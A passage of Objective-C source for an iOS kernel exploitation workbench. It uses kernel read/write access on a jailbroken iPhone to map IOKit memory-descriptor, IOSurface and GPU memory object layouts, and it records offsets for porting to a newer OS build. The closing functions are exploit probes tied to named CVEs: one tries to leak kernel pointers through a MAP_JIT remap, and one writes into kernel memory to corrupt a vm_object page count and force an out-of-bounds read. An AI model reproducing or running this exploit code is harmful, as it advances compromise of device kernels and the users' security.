            uint64_t pg = fkt_pva_to_page(pageq[i]); if (!is_kva(pg)) continue;
            [self log:@"  pageq[%d] → page 0x%llx", i, pg]; [self walkGMDZonePage:pg]; walked++;
            for (int d = 1; d <= 8 && walked < 16; d++) { uint64_t near = pg + (uint64_t)d * 0x4000ULL; uint64_t vt0 = [self jkread_ptr:near + eoff]; if (is_ktextish(vt0)) { [self walkGMDZonePage:near]; walked++; } }
        }
        if (!walked) [self log:@"  pageq packed did not decode — will still grid-scan live MD pages"];
    } else [self log:@"  no zone_t — grid-scan live MD pages only"];
    for (int i = 0; i < _n_live_mds; i++) {
        uint64_t md = _live_mds[i]; uint64_t page = md & ~0x3fffULL; uint16_t eoff = _gmd_elem_offs ? _gmd_elem_offs : 0x10;
        int on_grid = ((md - page - eoff) % 0xb0ULL) == 0;
        [self log:@"  live_md 0x%llx page=0x%llx on_gmd_grid=%d %@", md, page, on_grid, [self classNameFromVtable:[self jkread_ptr:md]]];
        [self printGmdShape:md tag:on_grid ? "live_GMD" : "live_NOT_GMD_ZONE"];
        if (on_grid) [self walkGMDZonePage:page]; else [self noteOccupant:md tag:"live_md"];
    }
    [self log:@"  OCC tally war=%d kern_win=%d other=%d zeroed=%d seen=%d shape1=%d pages=%d", _occ_user, _occ_kern_win, _occ_other, _occ_zero, _occ_seen_n, _ans_shape1_hits, _n_pages_walked];
    [self log:@"=== SHAPE LOCK (twin FIELD# only — 21D50 live) ==="];
    [self log:@"  zone iokit.IOGeneralMemoryDescriptor  esz=0xb0  eoff=0x10  elems/page=93"];
    [self log:@"  +0x00 vt  +0x20 flags  +0x50 getLength  +0x60 ranges*  +0x68 nRanges"];
    [self log:@"  +0x70 task  +0x78 inline IOAddressRange  +0x88 prepareCount  +0xa8 lock"];
    [self log:@"  A WAR      flags 0x110112/0x110113  task=client  ranges USER 0x4000+  ← 64788 spray"];
    [self log:@"  B KERN_WIN flags 0x11b  task=kernel_task  ranges 0xffffffe4…e8…  ← not Shape-1"];
    [self log:@"  C other vt (IOSurface +0x30)  often not on 0xb0 grid  ← different CLASS"];
    [self log:@"  Shape-1 = kalloc/IOKit body (KERN, not 0x11b kernel_task, len<0x400). This run shape1=%d", _ans_shape1_hits];
}

- (void)answerWriteBytesPrepare {
    [self log:@"=== Q7 — writeBytes / prepare dest class ==="];
    [self log:@"23F77 RE: IOMD::prepare @ 0xa514bc0 — flags+0x20, getLength+0x50, prepareCount+0x88, lock+0xa8; dest = prepareInternal UPL of THIS MD pages."];
    [self log:@"  dest in MD pages → NOT W. dest in kalloc/IOKit object → W cite (none named)."];
    if (!_n_live_mds) { [self log:@"  no live MD — skip"]; return; }
    uint64_t md = 0, a0 = 0; const char *cls = "NULL";
    for (int i = 0; i < _n_live_mds; i++) {
        uint64_t cand = _live_mds[i]; uint64_t ranges = [self jkread_ptr:cand + 0x60];
        uint64_t ra = (is_kva(ranges) && !is_ktextish(ranges)) ? [self jkread64:ranges] : 0;
        const char *rc = va_class(ra);
        if (strcmp(rc, "USER?") == 0 || (strcmp(rc, "KERN") == 0 && plausible_range_len((is_kva(ranges) && !is_ktextish(ranges)) ? [self jkread64:ranges + 8] : 0))) { md = cand; a0 = ra; cls = rc; if (strcmp(rc, "USER?") == 0) break; }
    }
    if (!md) md = _live_mds[0];
    uint64_t vt = [self jkread_ptr:md];
    if (!a0) { uint64_t ranges = [self jkread_ptr:md + 0x60]; a0 = (is_kva(ranges) && !is_ktextish(ranges)) ? [self jkread64:ranges] : 0; cls = va_class(a0); }
    [self log:@"  sample md=0x%llx vt+0xb0=0x%llx (getLength) vt+0xc8=0x%llx vt+0xd8=0x%llx (prepare)", md, is_kva(vt) ? [self jkread_ptr:vt + 0xb0] : 0, is_kva(vt) ? [self jkread_ptr:vt + 0xc8] : 0, is_kva(vt) ? [self jkread_ptr:vt + 0xd8] : 0];
    [self log:@"  live ranges[0]=0x%llx (%s) — prepare/writeBytes dest class = %s", a0, cls, cls];
    if (strcmp(cls, "USER?") == 0) [self log:@"  Q7: dest in MD USER pages → NOT W"];
    else if (strcmp(cls, "KERN") == 0) [self log:@"  Q7: dest KERN — if kalloc/IOKit object this is a W cite; else scratch"];
    else [self log:@"  Q7: dest class %s — not a W cite", cls];
}

- (void)answerSheet12mini {
    [self log:@"=== 12 MINI Q1–Q7 (21D50 live; twin FIELD# only onto 23F77) ==="];
    char osv[64] = {0}; size_t n = sizeof(osv); sysctlbyname("kern.osversion", osv, &n, NULL, 0);
    char mach[64] = {0}; n = sizeof(mach); sysctlbyname("hw.machine", mach, &n, NULL, 0);
    int q1 = (strcmp(osv, "21D50") == 0);
    [self log:@"Q1 uname/osversion=%s hw.machine=%s %s", osv, mach, q1 ? "OK 21D50" : "NOT 21D50 — say so"];
    [self log:@"Q2 IOGPUSysMemory 0x00–0x100: IOMD* qword"];
    [self log:@"  23F77 get_memory_descriptors: *(SysMemory+0x90)"];
    [self log:@"  21D50 live claim +0x80 (MOVED). This dump slot=+0x%llx", _ans_sysmem_md_slot];
    [self log:@"Q3 that IOMD: sizeof 0xb0 (OSMetaClass). +0x00 vt +0x20 flags"];
    [self log:@"  +0x50 getLength  +0x60 ranges  +0x88 prepareCount  +0xa8 lock"];
    [self log:@"  task_t: live qword match vs kernel_task=0x%llx our=0x%llx", _kernel_task, _self_task];
    [self log:@"  ranges: USER? = client WAR (not Shape-1). KERN + kalloc/IOKit = Shape-1"];
    [self log:@"Q4 IOSurface +0x30 = MD*? live slot=+0x%llx class via PAC-stripped vt", _ans_iosurface_md_slot ? _ans_iosurface_md_slot : 0x30];
    for (int i = 0; i < _n_iosurface_kvas && i < 3; i++) { uint64_t s = _iosurface_kvas[i]; uint64_t md30 = [self jkread_ptr:s + 0x30]; uint64_t vt = is_kva(md30) ? [self jkread_ptr:md30] : 0; [self log:@"  surf=0x%llx +0x30=0x%llx class %@", s, md30, [self classNameFromVtable:vt]]; }
    [self log:@"Q5 Metal bytesNoCopy type 0x80: resource+0x28 → SysMemory → MD (+0x80/0x90)"];
    [self log:@"  walked in PHASE3; SysMemory MD slot=+0x%llx", _ans_sysmem_md_slot];
    [self log:@"Q6 kernel_task GMDs: see OCC lines. Shape-1 only if ranges = kalloc/IOKit object."];
    [self log:@"  tally war=%d kern_win=%d other=%d shape1_hits=%d", _occ_user, _occ_kern_win, _occ_other, _ans_shape1_hits];
    [self log:@"Q7 prepare dest = this MD pages (23F77 0xa514bc0). writeBytes unnamed (vtable)."];
    [self log:@"  live dest class on first MD printed above. NOT W if USER pages."];
}

- (void)printAnswers {
    [self log:@"=== ANSWERS (21D50 live — twin CLASS/FIELD only onto 23F77) ==="];
    [self log:@"Q1 GMD zone elem/instSize: %s", _ans_gmd_elemsz ? [[NSString stringWithFormat:@"LOCKED 0x%llx", _ans_gmd_elemsz] UTF8String] : "UNRESOLVED"];
    [self log:@"Q2 IOSurface MD slot: %s (23F77 claim +0x30)", _ans_iosurface_md_slot ? [[NSString stringWithFormat:@"LOCKED +0x%llx", _ans_iosurface_md_slot] UTF8String] : "UNRESOLVED"];
    if (_ans_sysmem_md_slot) [self log:@"Q3 IOGPUSysMemory MD slot: LOCKED +0x%llx on 21D50 — twin 23F77 A14 as +0x90 (MOVED; do not paste)", _ans_sysmem_md_slot];
    else [self log:@"Q3 IOGPUSysMemory MD slot: UNRESOLVED (23F77 A14 claim +0x90)"];
    if (_ans_mag_cap_live > 0) [self log:@"Q4 magazine cap: LIVE max free_count=%d (23F77 KC CAP=8) zone=0x%llx", _ans_mag_cap_live, _gmd_zone_kva];
    else [self log:@"Q4 magazine cap: LOCKED 8 from 23F77 KC — live sample pending/zero"];
    [self log:@"Q5 IOMD prepare vt index: LOCKED +0xd8 present on live MD vt (see dump; twin INDEX not KVA)"];
    [self log:@"Q6 kalloc.3072 cstring: %s", _ans_kalloc3072 < 0 ? "UNRESOLVED" : (_ans_kalloc3072 ? "YES" : "LOCKED NO")];
    if (_ans_shape1_hits > 0) [self log:@"SHAPE-1 object-sized KERN GMD hits this run: %d — hunt FACTORY on 23F77", _ans_shape1_hits];
    else { [self log:@"SHAPE-1: 0 (KERN_WIN=%d are GPU/IOMMU maps, not kalloc objects)", _occ_kern_win]; [self log:@"  64788 spray SHAPE is variant A (USER WAR 0xb0 GMD). No new FACTORY."]; }
    [self log:@"12-mini Q1–Q7 sheet printed above. Twin CLASS/FIELD/FACTORY only."];
}

- (void)emitPointerHunt {
    [self log:@"=== POINTER HUNT (grep ^PTR ) ==="];
    [self log:@"rule: live KVAs are 21D50. Twin CLASS/FIELD# onto 23F77. Never paste live VAs into P007."];
    [self log:@"theories: IOGPUSYSMEM 64788 P010 IOSURFACE RESOURCE MAG"];
    [self log:@"IOGPUSysMemory 23F77: MD=+0x90 VA=+0x88 detach=+0x30. 21D50 MD=+0x80 (getter proved)."];
    [self log:@"64788 spray = GMD 0xb0 variant A (USER WAR). 0x11b kernel_task = KERN_WIN ≠ Shape-1."];
    [self log:@"P010: 21D50 word1=*(CommandQueue+0x550); 23F77/P007 = +0x558. Never the device kobj."];
    [self log:@"sysmem objects this run: %d  live MDs: %d  shape1: %d  war: %d  kern_win: %d", _n_sysmems, _n_live_mds, _ans_shape1_hits, _occ_user, _occ_kern_win];
    for (int i = 0; i < _n_iosurface_kvas && i < 8; i++) { uint64_t s = _iosurface_kvas[i]; uint64_t md = [self jkread_ptr:s + 0x30]; [self ptrTheory:"IOSURFACE" cite:@"surf+0x30" live:md note:[NSString stringWithFormat:@"surf=0x%llx", s]]; }
}

- (void)libkrwCaps {
    [self log:@"--- libkrw symbols ---"];
    [self log:@"kread=%d kwrite=%d kbase=%d physread=%d", _lib_kread != NULL, _lib_kwrite != NULL, _lib_kbase != NULL, _lib_physread != NULL];
    [self log:@"kwrite/physread present only — Phase 1 does not kernel-write or patch prologues."];
}

- (void)questions26 {
    [self log:@"=== 26.5 QUESTIONS this dump is for (21D50 numbers ≠ 23F77) ==="];
    [self log:@"Q1  GMD instSize  — 23F77 claim 0xb0. Live 17.3 size from metaclass dump."];
    [self log:@"Q2  IOSurface MD slot — 23F77 claim +0x30. Need kernel object hexdump next."];
    [self log:@"Q3  IOGPUSysMemory MD — 23F77 A14 claim +0x90 (22H311 was +0x80)."];
    [self log:@"Q4  magazine cap — 23F77 claim 8 @ 0x7ad20b8. Find zone_t on 21D50 first."];
    [self log:@"Q5  IOMD prepare vt index — 23F77 claim +0xd8. Compare live vtable slots."];
    [self log:@"Q6  kalloc.3072 exists as a DATA zone name? (runtime kalloc.%%zu)."];
    [self log:@"Match by CLASS NAME + instSize + vt slot INDEX, never by KVA."];
}

- (NSString *)runPhase1 {
    _out = [NSMutableString string];
    _ans_gmd_elemsz = 0; _ans_iosurface_md_slot = 0; _ans_sysmem_md_slot = 0; _ans_kalloc3072 = -1; _ans_shape1_hits = 0; _occ_kern_win = 0; _n_pages_walked = 0;
    memset(_pages_walked, 0, sizeof(_pages_walked)); _iosurface_md_off = 0; _gmd_zone_kva = 0; _gmd_zone_name_ptr = 0; _gmd_elem_offs = 0; _gmd_chunk_elems = 0; _ans_mag_cap_live = 0; _gmd_vtable = 0;
    _n_live_mds = 0; _occ_seen_n = 0; _occ_user = _occ_kern = _occ_other = _occ_zero = 0; _n_iosurface_kvas = 0; _n_sysmems = 0; _kernel_task = 0; _self_task = 0;
    memset(_sysmems, 0, sizeof(_sysmems)); memset(_live_mds, 0, sizeof(_live_mds)); memset(_occ_seen_list, 0, sizeof(_occ_seen_list)); memset(_iosurface_kvas, 0, sizeof(_iosurface_kvas));
    [self log:@"=== Lum1na-FKT 0.7.0 workbench  %@ ===", [NSDate date]];
    [self log:@"note: 12-mini Q1–Q7 — 21D50 MD +0x80 / queue+0x550; 23F77 twin +0x90 / +0x558"];
    [self log:@"%@", FKTLeftoverCatalog()];
    char rel[256] = {0}; size_t n = sizeof(rel); sysctlbyname("kern.osrelease", rel, &n, NULL, 0);
    char ver[512] = {0}; n = sizeof(ver); sysctlbyname("kern.version", ver, &n, NULL, 0);
    char osv[64] = {0}; n = sizeof(osv); sysctlbyname("kern.osversion", osv, &n, NULL, 0);
    [self log:@"osrelease=%s osversion=%s", rel, osv]; [self log:@"kern.version=%s", ver];
    [self log:@"DEVICE=iPhone13,1 21D50 workbench. Do not paste KVAs onto 23F77."];
    [self questions26];

    BOOL ok = [self openKRW];
    _slide = (_kbase && _kbase > FKT_UNSLID_BASE) ? (_kbase - FKT_UNSLID_BASE) : 0;
    [self log:@"krw backend=%@ open=%d kbase=0x%llx slide=0x%llx", _backend, ok, _kbase, _slide];
    [self libkrwCaps];
    if (!ok) { [self log:@"FAIL: no libkrw and no tfp0."]; [self flushFile]; return _out; }

    _kernel_task = [self resolveKernelTask]; _self_task = [self resolveSelfTask];
    [self log:@"task kernel=0x%llx self=0x%llx pid=%d", _kernel_task, _self_task, getpid()];
    uint32_t magic = [self kread32:_kbase]; [self log:@"kbase magic=0x%08x (expect 0xfeedfacf)", magic]; [self hexdump:_kbase size:0x40];

    [self dumpClassString:"IOMemoryDescriptor" unslid:FKT_STR_IOMD];
    [self dumpClassString:"IOGeneralMemoryDescriptor" unslid:FKT_STR_GMD];
    [self dumpClassString:"iokit.IOGeneralMemoryDescriptor" unslid:FKT_STR_GMD_ZONE];
    [self dumpClassString:"IOGPUSysMemory" unslid:FKT_STR_SYSMEM];
    [self dumpClassString:"IOSurfaceClient" unslid:FKT_STR_IOSURF_CLIENT];
    [self dumpClassString:"data.kalloc" unslid:FKT_STR_DATA_KALLOC];

    [self dumpIOSurfaceUserspace];
    [self dumpMetalSysMemory];
    [self dumpKalloc3072Probe];
    [self runLiveTests];
    [self scanGMDZoneOccupants];
    [self answerWriteBytesPrepare];
    [self answerSheet12mini];
    [self printAnswers];
    [self emitPointerHunt];

    [self log:@"=== end ==="];
    [self log:@"Paste lum1na-fkt-dump.txt. Twin CLASS/FIELD/FACTORY only — never 21D50 KVAs."];
    [self flushFile];
    return _out;
}

- (void)flushFile {
    NSString *path = FKTDumpPath(); NSError *err = nil;
    [_out writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&err];
    if (err) NSLog(@"[Lum1naFKT] write %@ failed %@", path, err);
    else NSLog(@"[Lum1naFKT] wrote %@", path);
}

// MARK: - Unlocked Primitive Probes

// P005: CVE-2026-64709 - JIT Downgrade Leak
// Unlock: Jailbreak context bypasses AMFI MAP_JIT gate.
- (NSString *)runP005JITDowngrade {
    _out = [NSMutableString string];
    [self log:@"\n=== P005 JIT Downgrade Probe (CVE-2026-64709) ==="];
    
    // 1. Allocate MAP_JIT page (0x800 flag)
    mach_vm_address_t jitAddr = 0;    kern_return_t kr = mach_vm_allocate(mach_task_self(), &jitAddr, 0x4000, VM_FLAGS_ANYWHERE | 0x800);
    if (kr != KERN_SUCCESS) {
        [self log:@"[-] mach_vm_allocate(MAP_JIT) failed: 0x%x (AMFI still blocking?)", kr];
        return @"P005 FAIL: MAP_JIT blocked";
    }
    [self log:@"[+] MAP_JIT allocated at 0x%llx", (unsigned long long)jitAddr];
    memset((void *)jitAddr, 0x41, 0x4000);

    // 2. Remap it to a new location (triggers vm_map_copyout_internal)
    mach_vm_address_t dstAddr = 0;    vm_prot_t cur, max;
    kr = mach_vm_remap(mach_task_self(), &dstAddr, 0x4000, 0, VM_FLAGS_ANYWHERE,
                       mach_task_self(), jitAddr, TRUE, &cur, &max, VM_INHERIT_COPY);
    if (kr != KERN_SUCCESS) {
        [self log:@"[-] mach_vm_remap failed: 0x%x", kr];
        return @"P005 FAIL: remap failed";
    }
    [self log:@"[+] Remapped to 0x%llx (cur=0x%x max=0x%x)", (unsigned long long)dstAddr, cur, max];

    // 3. Scan destination for kernel pointers (0xfffffff0...)
    uint64_t *p = (uint64_t *)dstAddr;
    int hits = 0;
    for (int i = 0; i < 0x4000/8; i++) {
        uint64_t v = p[i];
        if (is_kva(v)) {
            [self log:@"[+] P005 HIT: kptr at +0x%x = 0x%llx", i*8, v];
            hits++;
            if (hits > 10) break;
        }
    }
    
    if (hits == 0) {
        [self log:@"[-] P005: No kernel pointers found (buffer still 0x41). Bug may be patched or requires specific entry bits."];
    } else {
        [self log:@"[+] P005 SUCCESS: Kernel memory disclosed via JIT downgrade!"];
    }

    mach_vm_deallocate(mach_task_self(), jitAddr, 0x4000);
    mach_vm_deallocate(mach_task_self(), dstAddr, 0x4000);
    return [NSString stringWithFormat:@"P005 done, hits=%d", hits];
}

// 65349: CVE-2026-65349 - IOPL Packed-Page OOB Read
// Unlock: We use KRW to artificially corrupt the vm_object resident_page_count
// to force the iopl walk into an OOB state.
- (NSString *)run65349IOPLLeak {
    _out = [NSMutableString string];
    [self log:@"\n=== 65349 IOPL Packed-Page OOB Probe (CVE-2026-65349) ==="];
    
    // 1. Create IOSurface
    IOSurfaceRef s = [KReader makeSurfaceW:64 h:64];
    if (!s) return @"65349 FAIL: no surface";
    
    mach_port_t mp = IOSurfaceCreateMachPort(s);
    uint64_t surf = [self surfaceFromPort:mp inTask:_jb_task_self()];
    if (!is_kva(surf)) return @"65349 FAIL: no surf kva";
    
    uint64_t md = [self mdFromSurface:surf];
    if (!is_kva(md)) return @"65349 FAIL: no md kva";
    
    [self log:@"[+] Surface=0x%llx MD=0x%llx", surf, md];

    // 2. Find vm_object (usually at MD+0x110 or MD+0x100)
    uint64_t vm_obj = 0;
    for (uint32_t off = 0x100; off <= 0x140; off += 8) {
        uint64_t p = [self jkread_ptr:md + off];
        if (is_kva(p) && !is_ktextish(p)) {
            vm_obj = p;
            [self log:@"[+] Found vm_object at MD+0x%x = 0x%llx", off, vm_obj];
            break;
        }
    }
    
    if (!is_kva(vm_obj)) {
        [self log:@"[-] Could not find vm_object in MD slots"];
        return @"65349 FAIL: vm_object not found";
    }

    // 3. Artificially inflate resident_page_count to force OOB walk
    // Note: On 17.3, resident_page_count is usually at vo+0x8c or vo+0x90
    uint32_t orig_rpc = [self kread32:vm_obj + 0x90];
    [self log:@"[*] Original resident_page_count = %u", orig_rpc];
    
    [self log:@"[*] Planting artificial resident_page_count (0x1000)..."];
    [self kwrite32:vm_obj + 0x90 val:0x1000];

    // 4. Trigger IOSurfaceLock -> prepare -> vm_object_iopl_request
    [self log:@"[*] Triggering IOSurfaceLock..."];
    kern_return_t kr = IOSurfaceLock(s, 0, NULL);
    [self log:@"[*] IOSurfaceLock returned 0x%x", kr];

    // 5. Restore the count to prevent immediate panic
    [self kwrite32:vm_obj + 0x90 val:orig_rpc];
    [self log:@"[*] Restored resident_page_count"];

    // 6. Check IOSurface backing for wild PFN
    [self log:@"[+] 65349 Probe complete. Check for panics or wild PFNs in surface data."];
    
    if (MACH_PORT_VALID(mp)) mach_port_deallocate(mach_task_self(), mp);
    CFRelease(s);
    return @"65349 done";
}

@end
